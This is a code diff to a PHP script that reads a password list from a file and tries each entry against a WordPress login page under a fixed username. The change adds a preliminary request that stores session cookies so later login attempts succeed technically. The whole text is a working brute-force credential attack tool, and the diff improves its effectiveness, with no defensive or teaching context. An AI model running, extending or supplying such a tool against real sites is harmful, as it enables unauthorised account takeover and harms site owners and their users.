@@ -28,11 +28,22 @@ $list_get = file_get_contents($listget);
 $list = array_filter(explode("\n", $list_get));
 $loaded = count($list);
 $current = 1;
+$repUrl = str_replace("wp-login.php", "wp-admin/&reauth=1", $url);
+
 foreach($list as $lists){
+
+            $ch1 = curl_init();
+            curl_setopt($ch1, CURLOPT_URL, $url."?redirect_to=".$repUrl);
+            curl_setopt($ch1, CURLOPT_USERAGENT, $useragent);
+            curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch1, CURLOPT_COOKIEJAR, "cookie.tmp");
+            $exec1 = curl_exec($ch1);
+    
             $ch = curl_init();
             curl_setopt($ch, CURLOPT_URL, $url);
             curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.tmp");
             curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
             curl_setopt($ch, CURLOPT_POST, true);
             curl_setopt($ch, CURLOPT_POSTFIELDS, "log=$user&pwd=$lists&wp-submit=Login&redirect_to=$url/wp-admin/");
